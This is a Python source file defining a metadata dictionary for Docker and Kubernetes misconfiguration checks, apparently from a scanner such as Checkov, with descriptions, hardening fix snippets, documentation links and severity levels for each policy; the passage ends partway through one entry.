metadata = {
    "CKV_DOCKER_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-port-22-is-not-exposed",
        "description": "Port 22 is exposed\nDescription\nBy exposing port 22,  you may allow a bad actor to brute force their way into the system and potentially get access to the entire network. As a best practice, restrict SSH solely to known static IP addresses. Limit the access list to include known hosts, services, or specific employees only.\nFix - Buildtime \nDocker\nDockerfileFROM busybox\n\nEXPOSE 8080\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-healthcheck-instructions-have-been-added-to-container-images",
        "description": "Healthcheck instructions have not been added to container images\nDescription\nWe recommend that you add the HEALTHCHECK instruction to your Docker container images  to ensure that health checks are executed against running containers.\nAn important security control is that of availability. Adding the HEALTHCHECK instruction to your container image ensures that the Docker engine periodically checks the running container instances against that instruction to ensure that containers are still operational.\nBased on the results of the health check, the Docker engine could terminate containers which are not responding correctly, and instantiate new ones.\nFix - Buildtime \nDocker\nDockerfileFROM base\n\nLABEL foo=\"bar baz\nUSER  me\nHEALTHCHECK CMD curl --fail http://localhost:3000 || exit 1\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-a-user-for-the-container-has-been-created",
        "description": "A user for the container has not been created\nDescription\nContainers should run as a non-root user. It is good practice to run the container as a non-root user, where possible. This can be done either via the USER directive in the Dockerfile or through gosu or similar where used as part of the CMD or ENTRYPOINT directives.\nFix - Buildtime \nDocker\nDockerfileFROM base\n\nLABEL foo=\"bar baz\nUSER  me\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-copy-is-used-instead-of-add-in-dockerfiles",
        "description": "Copy is not used instead of Add in Dockerfiles\nDescription\nThe Copy instruction simply copies files from the local host machine to the container file system. The Add instruction could potentially retrieve files from remote URLs and perform operations such as unpacking them. The Add instruction, therefore, introduces security risks. For example, malicious files may be directly accessed from URLs without scanning, or there may be vulnerabilities associated with decompressing them\nWe recommend you use the Copy instruction instead of the Add instruction in the Dockerfile.\nFix - Buildtime\nDockerfile\nDockerfile- ADD config.txt /app/\n+ COPY config.txt /app/\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-update-instructions-are-not-used-alone-in-the-dockerfile",
        "description": "Update instructions are used alone in a Dockerfile\nDescription\nYou should not use OS package manager update instructions such as apt-get update or yum update either alone or in a single line in the Dockerfile.\nAdding update instructions in a single line on the Dockerfile will cause the update layer to be cached. When you then build any image later using the same instruction, this will cause the previously cached update layer to be used, potentially preventing any fresh updates from being applied to later builds.\nFix - Buildtime \nDocker\nDockerfileFROM base\n\nRUN apt-get update \\\n && apt-get install -y --no-install-recommends foo \\\n && echo gooo\n\nRUN apk update \\\n && apk add --no-cache suuu looo\n\nRUN apk --update add moo\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_7": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-base-image-uses-a-non-latest-version-tag",
        "description": "Base image uses a latest version tag\nDescription\nWhen possible, it is recommended to pin the version for the base image in your Dockerfiles. There are a number of potential issues that may be caused when using the latest tag. Since latest is the default tag when a tag is not specified, it does not automatically refer to the latest version of the image. This can lead to the use of outdated images and in the case of production deployments, using a dynamic version can cause unexpected behavior and difficulty in determining which version is being currently used. It is best practice to be specific as possible about what is running to make operations predictable and reliable\nFix - Buildtime\nDockerfile\nDockerfile- FROM alpine:latest\n+ FROM alpine:3.17.1\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_8": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-last-user-is-not-root",
        "description": "Last USER is root\nDescription\nThe Docker containers by default run with the root privilege and so does the application that runs inside the container. This is a major concern from the security perspective because hackers can gain root access to the Docker host by hacking the application running inside the container.\nFix - Buildtime\nDockerfile\nRemove USER root or add a non-root user after.\nDockerfileFROM base\n\n- USER root\n+ USER userA\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-label-maintainer-is-used-instead-of-maintainer-deprecated",
        "description": "LABEL maintainer is not used instead of MAINTAINER (deprecated)\nDescription\nThe LABEL instruction is much more flexible and recommended to replace the MAINTAINER (deprecated) instruction in a Dockerfile.\nFix - Buildtime \nDocker\nDockerfileFROM  base\n\n- MAINTAINER bad\n+ LABEL maintainer = good\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_9": {
        "url": "https://docs.bridgecrew.io/docs/ensure-docker-apt-is-not-used",
        "description": "Docker APT is used\nDescription\nIt is generally a best practice to avoid using APT (Advanced Package Tool) when working with Docker containers. This is because APT is designed to work with traditional server-based environments, and may not be well-suited for use with containers.\nUsing APT with Docker containers can create potential security risks, as it may allow packages to be installed that are not designed to work with containers. This can lead to compatibility issues and potentially compromise the security of your containers.\nFix - Buildtime\nDocker\nDockerfileFROM busybox:1.0\nRUN apt-get install curl\nHEALTHCHECK CMD curl --fail http://localhost:3000 || exit 1\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_10": {
        "url": "https://docs.bridgecrew.io/docs/ensure-docker-workdir-values-are-absolute-paths",
        "description": "Docker WORKDIR values are not absolute paths\nDescription\nUsing absolute paths for the WORKDIR values in your Dockerfiles can help improve the security and reliability of your builds. The WORKDIR value specifies the working directory for the build stage, and using an absolute path ensures that the correct directory is being used.\nBy using absolute paths for WORKDIR, you can help prevent potential issues such as using the wrong directory for a stage, which can lead to compatibility problems and potentially compromise the security of your containers. It can also help ensure that your builds are consistent and reliable, as you can easily identify which directory is being used for each stage.\nFix - Buildtime\nDocker\nDockerfileFROM alpine:3.5\nRUN apk add --update py2-pip\nRUN pip install --upgrade pip\nWORKDIR /path/to/workdir\nWORKDIR /\nWORKDIR c:\\\\windows\nWORKDIR \"/path/to/workdir\"\nWORKDIR \"c:\\\\windows\"\nENV DIRPATH=/path\nENV GLASSFISH_ARCHIVE glassfish5\nWORKDIR $DIRPATH/$DIRNAME\nWORKDIR ${GLASSFISH_HOME}/bin\nCOPY requirements.txt /usr/src/app/\nRUN pip install --no-cache-dir -r /usr/src/app/requirements.txt\nCOPY app.py /usr/src/app/\nCOPY templates/index.html /usr/src/app/templates/\nEXPOSE 5000\nCMD [\"python\", \"/usr/src/app/app.py\"]\n",
        "severity": "LOW"
    },
    "CKV_DOCKER_11": {
        "url": "https://docs.bridgecrew.io/docs/ensure-docker-from-alias-is-unique-for-multistage-builds",
        "description": "Docker From alias is not unique for multistage builds\nDescription\nUsing unique FROM aliases in your Docker multistage builds can help improve the security and reliability of your builds. The FROM alias is used to specify the base image for a build stage, and using a unique alias for each stage can help prevent confusion and ensure that the correct image is being used.\nFix - Buildtime\nDocker\nDockerfileFROM debian:jesse1 as build\nRUN stuff\n\nFROM debian:jesse1 as another-alias\nRUN more_stuff\n",
        "severity": "LOW"
    },
    "CKV_K8S_6": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_5",
        "description": "Root containers admitted\nDescription\nIn Kubernetes, a container's user ID table maps to the host's user table. Running a process as the root user inside a container runs it as root on the host. Many container images use the root user to run PID 1. If PID 1 is compromised, an attacker has root permissions in the container, and any misconfigurations can be exploited. \nContainers that run as root frequently have more permissions than their workload requires which, in case of compromise, could help an attacker further their exploits.\nFix - Buildtime\nKubernetes\n\nResource: PodSecurityPolicy\nArguments:\nrunAsUser:rule:MustRunAsNonRoot - Unable containers to run with root privileges.\nrunAsUser:rule:MustRunAs - When the minimum range is set to 1 or higher, containers cannot run as root.\n\nYAMLapiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: <policy name>\nspec:\n    runAsUser:\n+   rule: 'MustRunAsNonRoot'\nor\n    rule: 'MustRunAs'\n    ranges:\n+   - min: <min user, 1 or higher>\n      max: <max user>\n\nTo use a PodSecurityPolicy resource, the requesting user or target pod\u2019s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use RBAC, a standard Kubernetes authorization mode.\nA Role or ClusterRole needs to grant access to use the desired policies. \nKind: ClusterRole\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: <role name>\nrules:\n- apiGroups: ['policy']\n  resources: ['podsecuritypolicies']\n  verbs:     ['use']\n  resourceNames:\n  - <policy name>\n\nThe ClusterRole is bound to the authorized service(s):\nKind: ClusterRoleBinding\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <binding name>\nroleRef:\n  kind: ClusterRole\n  name: <role name>\n  apiGroup: rbac.authorization.k8s.io\nsubjects:\n- kind: ServiceAccount\n  name: <authorized service account name>\n  namespace: <authorized pod namespace>\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_1": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_1",
        "description": "Containers wishing to share host process ID namespace admitted\nDescription\nWhen process namespace sharing is enabled, processes in a container are visible to all other containers in that pod. This feature can enable configuring cooperating containers that do not include debugging tools, such as a logger sidecar container or troubleshooting container images.\nSharing the host process ID namespace breaks the isolation between container images and can make processes visible to other containers in the pod. This includes all information in the /proc directory, which can sometimes include passwords or keys, passed as environment variables.\nWe recommend you do not admit containers wishing to share the host process ID namespace.\nFix - Buildtime \nKubernetes\n\nResource: PodSecurityPolicy\nArgument: hostPID (Optional)\nWhen set to false, Pod are unable to use their host's PID namespace.\n\nYAMLapiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: <policy name>\nspec:\n+ hostPID: false\n\nTo use a PodSecurityPolicy resource the requesting user or target pod\u2019s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use RBAC, a standard Kubernetes authorization mode.\nA Role or ClusterRole must grant access to use the desired policies. \nKind: ClusterRole\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: <role name>\nrules:\n- apiGroups: ['policy']\n  resources: ['podsecuritypolicies']\n  verbs:     ['use']\n  resourceNames:\n  - <policy name>\n\nThe ClusterRole is then bound to the authorized service(s):\nKind: ClusterRoleBinding\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <binding name>\nroleRef:\n  kind: ClusterRole\n  name: <role name>\n  apiGroup: rbac.authorization.k8s.io\nsubjects:\n- kind: ServiceAccount\n  name: <authorized service account name>\n  namespace: <authorized pod namespace>\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_2": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_2",
        "description": "Privileged containers are admitted\nDescription\nPrivileged containers are containers that have all of the root capabilities of a host machine, allowing  access to resources that are not accessible in ordinary containers. \nRunning a container with a privileged flag allows users to have critical access to the host\u2019s resources. If a privileged container is compromised, it does not necessarily entail remote code execution, but it implies that an attacker will be able to run full host root with all of the available capabilities, including  CAP_SYS_ADMIN.\nCommon uses of privileged containers include: running a Docker daemon inside a Docker container, running a container with direct hardware access, and automating CI/CD tasks in the open-source automation server Jenkins.\nFix - Buildtime \nKubernetes\n\nResource: PodSecurityPolicy\nArgument: privileged (Optional)\nWhen set to false, containers are unable to run processes that are essentially equivalent to root on the host.\n\nYAMLapiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: <policy name>\nspec:\n+ privileged: false\n\nTo use a PodSecurityPolicy resource, the requesting user or target pod\u2019s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use RBAC, a standard Kubernetes authorization mode.\nA Role or ClusterRole must grant access to use the desired policies. \nKind: ClusterRole\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: <role name>\nrules:\n- apiGroups: ['policy']\n  resources: ['podsecuritypolicies']\n  verbs:     ['use']\n  resourceNames:\n  - <policy name>\n\nThe ClusterRole is then bound to the authorized service(s):\nKind: ClusterRoleBinding\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <binding name>\nroleRef:\n  kind: ClusterRole\n  name: <role name>\n  apiGroup: rbac.authorization.k8s.io\nsubjects:\n- kind: ServiceAccount\n  name: <authorized service account name>\n  namespace: <authorized pod namespace>\n",
        "severity": "HIGH"
    },
    "CKV_K8S_3": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_3",
        "description": "Containers wishing to share host IPC namespace admitted\nDescription\nThe host IPC namespace controls whether a pod's containers can be shared. You can administer cluster-level restrictions to ensure that containers remain isolated using PodSecurityPolicy and ensuring hostIPC is set to False. \nPreventing sharing of host PID/IPC namespace, networking, and ports ensures proper isolation between Docker containers and the underlying host.\nFix - Buildtime\nKubernetes\n\nResource: PodSecurityPolicy\nArgument: hostIPC\nDetermines if the policy allows the use of HostIPC in the pod spec.\n\nYAMLapiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: <policy name>\nspec:\n+ hostIPC: false\n\nTo use a PodSecurityPolicy resource, the requesting user or target pod\u2019s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use RBAC, a standard Kubernetes authorization mode.\nA Role or ClusterRole must grant access to use the desired policies. \nKind: ClusterRole\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: <role name>\nrules:\n- apiGroups: ['policy']\n  resources: ['podsecuritypolicies']\n  verbs:     ['use']\n  resourceNames:\n  - <policy name>\n\nThe ClusterRole is then bound to the authorized service(s):\nKind: ClusterRoleBinding\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <binding name>\nroleRef:\n  kind: ClusterRole\n  name: <role name>\n  apiGroup: rbac.authorization.k8s.io\nsubjects:\n- kind: ServiceAccount\n  name: <authorized service account name>\n  namespace: <authorized pod namespace>\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_4": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_4",
        "description": "Containers wishing to share host network namespace admitted\t\nDescription\nIn a Kubernetes cluster, every pod gets its own IP address. Pods can be treated much like VMs or physical hosts from the perspectives of port allocation, naming, service discovery, load balancing, application configuration, and migration. \nSharing the host network namespace breaks the isolation between container images and can make the host visible to other containers in the pod. In some cases, pods in the host network of a node can communicate with all pods on all nodes without using network address translation (NAT).\nFix - Buildtime \nKubernetes\n\nResource: PodSecurityPolicy\nArgument: hostNetwork (Optional)\nWhen set to false, Pods are unable to use their host's network namespace.\n\nYAMLapiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: <policy name>\nspec:\n+ hostNetwork: false\n\nTo use a PodSecurityPolicy resource, the requesting user or target pod\u2019s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use RBAC, a standard Kubernetes authorization mode.\nA Role or ClusterRole needs to grant access to use the desired policies. \nKind: ClusterRole\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: <role name>\nrules:\n- apiGroups: ['policy']\n  resources: ['podsecuritypolicies']\n  verbs:     ['use']\n  resourceNames:\n  - <policy name>\n\nThe ClusterRole is then bound to the authorized service(s):\nKind: ClusterRoleBinding\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <binding name>\nroleRef:\n  kind: ClusterRole\n  name: <role name>\n  apiGroup: rbac.authorization.k8s.io\nsubjects:\n- kind: ServiceAccount\n  name: <authorized service account name>\n  namespace: <authorized pod namespace>\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_7": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_6",
        "description": "Containers with NET_RAW capability admitted\nDescription\nNET_RAW is a default permissive setting in Kubernetes allowing ICMP traffic between containers and  grants an application the ability to craft raw packets.\nIn the hands of an attacker NET_RAW can enable a wide variety of networking exploits from within the cluster.\nFix - Buildtime\nKubernetes\n\nResource: PodSecurityPolicy\nArgument: requiredDropCapabilities (Optional)\nDefines the capabilities which must be dropped from containers. These capabilities are removed from the default set, and must not be added. NET_RAW capability is removed when the field includes it specifically, or when it includes ALL.\n\nYAMLapiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: <policy name>\nspec:\n  requiredDropCapabilities: \n+   -ALL\nor\n+ -NET_RAW\n\nTo use a PodSecurityPolicy resource, the requesting user or target pod\u2019s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use RBAC, a standard Kubernetes authorization mode.\nFirst, a Role or ClusterRole needs to grant access to use the desired policies. \nKind: ClusterRole\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: <role name>\nrules:\n- apiGroups: ['policy']\n  resources: ['podsecuritypolicies']\n  verbs:     ['use']\n  resourceNames:\n  - <policy name>\n\nThe ClusterRole is then bound to the authorized service(s):\nKind: ClusterRoleBinding\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <binding name>\nroleRef:\n  kind: ClusterRole\n  name: <role name>\n  apiGroup: rbac.authorization.k8s.io\nsubjects:\n- kind: ServiceAccount\n  name: <authorized service account name>\n  namespace: <authorized pod namespace>\n",
        "severity": "LOW"
    },
    "CKV_K8S_8": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_7",
        "description": "Liveness probe is not configured\nDescription\nThe kubelet uses liveness probes to know when to schedule restarts for containers. Restarting a container in a deadlock state can help to make the application more available, despite bugs. \nIf a container is unresponsive, either to a deadlocked application or a multi-threading defect, restarting the container can make the application more available, despite the defect.\nFix - Buildtime\nKubernetes\n\nResource: Container\nField: livenessProbe (Optional)\nThe probe describes a health check to be performed against a container to determine whether it is alive or not.\nIts arguments may include: exec, failureThreshold, httpGet, initialDelaySeconds, periodSeconds, successThreshold, tcpSocket and timeoutSeconds.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n+   livenessProbe:\n      <Probe arguments>\n",
        "severity": "LOW"
    },
    "CKV_K8S_9": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_8",
        "description": "Readiness probe is not configured\nDescription\nReadiness Probe is a Kubernetes capability that enables teams to make their applications more reliable and robust. This probe regulates under what circumstances the pod should be taken out of the list of service endpoints so that it no longer responds to requests. In defined circumstances the probe can remove the pod from the list of available service endpoints.\nUsing the Readiness Probe ensures teams define what actions need to be taken to prevent failure and ensure recovery in case of unexpected errors.\nKubernetes.io Documentation\nFix - Buildtime\nKubernetes\nResource: Container\nField: readinessProbe (Optional)\nThe probe describes a health check to be performed against a container to determine whether it is ready for traffic or not.\nIts configurations may include: exec, failureThreshold, httpGet, initialDelaySeconds, periodSeconds, successThreshold, tcpSocket and timeoutSeconds.\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n+   readinessProbe:\n      <Probe configurations>\n",
        "severity": "LOW"
    },
    "CKV_K8S_10": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_9",
        "description": "CPU request is not set\nDescription\nWhen specifying the resource request for containers in a pod, the scheduler uses this information to decide which node to place the pod on. When setting resource limit for a container, the kubelet enforces those limits so that the running container is not allowed to use more of that resource than the limit you set.\nIf a container is created in a namespace that has a default CPU limit, and the container does not specify its own CPU limit, then the container is assigned the default CPU limit. Kubernetes assigns a default CPU request under certain conditions.\nFix - Buildtime\nKubernetes\n\nResource: Container\nArgument: resources:requests:cpu (Optional)\nDefines the CPU request size for the container.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    resources:\n      requests:\n+       cpu: <cpu request>\n",
        "severity": "LOW"
    },
    "CKV_K8S_11": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_10",
        "description": "CPU limits are not set\nDescription\nKubernetes allows administrators to set CPU quotas in namespaces, as hard limits for resource usage. Containers cannot use more CPU than the configured limit. Provided the system has CPU time free, a container is guaranteed to be allocated as much CPU as it requests.\nCPU quotas are used to ensure adequate utilization of shared resources. A system without managed quotas could eventually collapse due to  inadequate resources for the tasks it bares.\nFix - Buildtime\nKubernetes\n\nResource: Container\nArgument: resources:limits:cpu (Optional)\nDefines the CPU limit for the container.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    resources:\n      limits:\n+       cpu: <cpu limit>\n",
        "severity": "LOW"
    },
    "CKV_K8S_12": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_11",
        "description": "Memory requests are not set\nDescription\nMemory resources can be defined using values from bytes to petabytes, it is common to use mebibytes. If you configure a memory request that is larger than the amount of memory on your nodes, the pod will never be scheduled. When specifying a memory request for a container, include the resources:requests field in the container\u2019s resource manifest. To specify a memory limit, include resources:limits.\nSetting memory requests enforces a memory limit for a container. A container is guaranteed to have as much memory as it requests, but is not allowed to use more memory than the limit set. This configuration may save resources and prevent an attack on an exploited container.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: resources:requests:memory (Optional)\nDefines the memory request size for the container.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    resources:\n      requests:\n+       memory: <memory request>\n",
        "severity": "LOW"
    },
    "CKV_K8S_13": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_12",
        "description": "Memory limits are not set\nDescription\nThe scheduler uses resource request information for containers in a pod to decide which node to place the pod on. The kubelet enforces the resource limits set, so that the running container is not allowed to use more resource than the limit set.\nIf a process in the container tries to consume more than the allowed amount of memory, the system kernel terminates the process that attempted the allocation, with an out of memory (OOM) error. With no limit set, kubectl allocates more and more memory to the container until it runs out.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: resources:limits:memory (Optional)\nDefines the memory limit for the container.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    resources:\n      limits:\n+       memory: <memory limit>\n",
        "severity": "LOW"
    },
    "CKV_K8S_16": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_15",
        "description": "Container is privileged\nDescription\nPrivileged containers are containers that have all of the root capabilities of a host machine, allowing access to resources that are not accessible in ordinary containers. Common uses of privileged containers include: running a Docker daemon inside a Docker container, running a container with direct hardware access, and automating CI/CD tasks in the open-source automation server Jenkins.\nRunning a container with a privileged flag allows users to have critical access to the host\u2019s resources. If a privileged container is compromised, it does not necessarily entail remote code execution, but it implies that an attacker will be able to run full host root with all of the available capabilities, including  CAP_SYS_ADMIN.\nFix - Buildtime\nKubernetes\n\nResource: Container\nArgument: privileged (Optional)\nIf true, processes in the privileged containers are essentially equivalent to root on the host. Default to false.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n-      privileged: true\n",
        "severity": "HIGH"
    },
    "CKV_K8S_17": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_16",
        "description": "Containers share host process ID namespace\nDescription\nNamespaces provide isolation for running processes and limit access to system resources, without the running process agnostic to its limitations. \nTo limit an attacker's options to escalate privileges from within a container, we recommend you configure containers to refrain from sharing the host process ID namespace.\nFix - Buildtime \nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: hostPID (Optional)\nIf true, the Pod uses the host's PID namespace. Default to false.\n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n- hostPID: true\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n-          hostPID: true\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n-       hostPID: true\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_18": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_17",
        "description": "Containers share host IPC namespace\nDescription\nPods share many resources, so it could make sense to share a process namespace. Some container images may expect to be isolated from other containers. Not sharing IPC namespaces  helps ensure isolation. Containers in different pods have distinct IP addresses and will need special configuration to communicate by IPC.\nFix - Buildtime\nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: hostIPC (Optional)\nIf true, the Pod uses the host's IPC namespace. Default to false.\n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n- hostIPC: true\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n-          hostIPC: true\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n-       hostIPC: true\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_19": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_18",
        "description": "Containers share the host network namespace\nDescription\nWhen using the host network mode for a container, that container\u2019s network stack is not isolated from the Docker host, so the container shares the host\u2019s networking namespace and does not get its own IP-address allocation.\nTo limit an attacker's options to escalate privileges from within a container, we recommend you to configure containers to not share the host network namespace.\nFix - Buildtime \nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: hostNetwork (Optional)\nIf true, the Pod uses the host's network namespace. Default to false.\n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n- hostNetwork: true\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n-          hostNetwork: true\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n-       hostNetwork: true\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_20": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_19",
        "description": "Containers run with AllowPrivilegeEscalation\nDescription\nThe AllowPrivilegeEscalation Pod Security Policy controls whether or not a user is allowed to set the security context of a container to True. Setting it to False ensures that no child process of a container can gain more privileges than its parent.\nWe recommend you to set AllowPrivilegeEscalation to False, to ensure RunAsUser commands cannot bypass their existing sets of permissions.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: allowPrivilegeEscalation (Optional)\nIf false, the pod can not request to allow privilege escalation. Default to true.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n+      allowPrivilegeEscalation: false\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_21": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_20",
        "description": "Default namespace is used\nDescription\nIn Kubernetes, the cluster comes out of the box with a namespace called \u201cdefault.\u201d Other namespaces Kubernetes includes are: default, kube-system and kube-public. Some Kubernetes tooling is set up out of the box to use this namespace and you can\u2019t delete it. \nWe recommend that you do not use the default namespace in large production systems. Using this space can result in accidental disruption with other services. Instead, we recommend you create alternate namespaces and use them to run additional required services.\nFix - Buildtime \nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: namespace (Optional)\nDefines the used namespace. Default to default.\n\nYAMLapiVersion: <apiVersion>\nkind: <kind>\nmetadata:\n  name: <name>\n+ namespace: <your namespace>\n- namespace: default\n",
        "severity": "LOW"
    },
    "CKV_K8S_22": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_21",
        "description": "Read-Only filesystem for containers is not used\nDescription\nA read-only root filesystem helps to enforce an immutable infrastructure strategy. The container should only write on mounted volumes that can persist, even if the container exits.  \nUsing an immutable root filesystem and a verified boot mechanism prevents against attackers from \"owning\" the machine through permanent local changes. An immutable root filesystem can also prevent malicious binaries from writing to the host system.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: readOnlyRootFilesystem (Optional)\nDefines whether a container is able to write into the root filesystem. Default to false.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n+      readOnlyRootFilesystem: true\n",
        "severity": "LOW"
    },
    "CKV_K8S_23": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_22",
        "description": "Admission of root containers not minimized\nDescription\nContainers rely on the traditional Unix security model granting explicit and implicit permissions to resources, through permissions granted to users and groups. User namespaces are not enabled in Kubernetes. The container's user ID table maps to the host's user table, and running a process as the root user inside a container runs it as root on the host. Although possible, we do not recommend running as root inside the container.\nContainers that run as root usually have far more permissions than their workload requires. In case of compromise, an attacker can use these permissions to further an attack on the network. Several container images use the root user to run PID 1. An attacker will have root permissions in the container and be able to exploit mis-configurations.\nFix - Buildtime \nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArguments:\nrunAsNonRoot (Optional) If true, Requires the container to run without root privileges. Default to false.\nrunAsUser (Optional) If user number is anything other than 0, requires the container to run with that user id, which is not root.\n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n    securityContext:\n+   runAsNonRoot: true\n+   runAsUser: <specific user>\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n            securityContext:\n+            runAsNonRoot: 